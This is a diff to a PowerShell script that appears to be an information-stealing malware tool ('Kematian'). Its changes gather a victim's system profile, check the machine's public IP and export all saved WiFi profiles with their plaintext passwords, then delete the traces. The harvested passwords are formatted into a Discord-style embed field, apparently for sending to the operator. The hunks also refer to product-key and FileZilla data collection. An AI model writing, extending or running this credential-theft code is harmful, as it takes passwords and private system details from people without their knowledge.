@@ -91,7 +91,7 @@ function Search-Mac ($mac_addresses) {
 }
 
 function Search-IP ($ip_addresses) {
-    $pc_ip = Invoke-WebRequest -Uri "https://ipapi.co/ip" -UseBasicParsing
+    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $pc_ip = $pc_ip.Content
     return $ip_addresses -contains $pc_ip
 }
@@ -365,24 +365,43 @@ function Backup-Data {
                 "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                 "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
             }
+            Write-Output ""  
         }
-        $results 
+        $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
     }
+    
     $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
-    $info = "$kematian_info`n`n`n$networkinfo `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
+    $alldiskinfo = $alldiskinfo.Trim()
+
+    $info = "$kematian_info`n`n[Network] `n$networkinfo `n[Disk Info] `n$alldiskinfo `n`n[System] `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network Adapters] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
     $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8
 
-    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
-        $name = $_.Matches.Groups[1].Value.Trim()
-        (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
-            [PSCustomObject]@{
-                PROFILE_NAME = $name
-                PASSWORD     = $_.Matches.Groups[1].Value.Trim()
-            }
+    Function Get-WiFiInfo {
+    $wifidir = "$env:tmp"
+    New-Item -Path "$wifidir\wifi" -ItemType Directory -Force | Out-Null
+	netsh wlan export profile folder="$wifidir\wifi" key=clear | Out-Null
+    $xmlFiles = Get-ChildItem "$wifidir\wifi\*.xml"
+    if ($xmlFiles.Count -eq 0) {
+        return $false
+    }
+    $wifiInfo = @()
+    foreach ($file in $xmlFiles) {
+        [xml]$xmlContent = Get-Content $file.FullName
+        $wifiName = $xmlContent.WLANProfile.SSIDConfig.SSID.name
+        $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
+        $wifiAuth = $xmlContent.WLANProfile.MSM.security.authEncryption.authentication
+        $wifiInfo += [PSCustomObject]@{
+            SSID = $wifiName
+            Password = $wifiPassword
+            Auth = $wifiAuth
         }
     }
-    $wifi = $wifipasslist | Format-Table -AutoSize | Out-String
-    $wifi | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
+    $wifiInfo | Format-Table -AutoSize | Out-String
+	$wifiInfo | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
+    }
+    $wifipasswords = Get-WiFiInfo 
+    ri "$env:tmp\wifi" -Recurse -Force
+    $wifipasswords
 
     function Get-ProductKey {
         try {
@@ -1176,7 +1195,7 @@ FileZilla: $filezilla_info
                     },
                     @{
                         "name"  = ":wireless: WiFi"
-                        "value" = "``````$wifi``````"
+                        "value" = "``````$wifipasswords``````"
                     }
                     @{
                         "name" = ":file_folder: Kematian File Info"
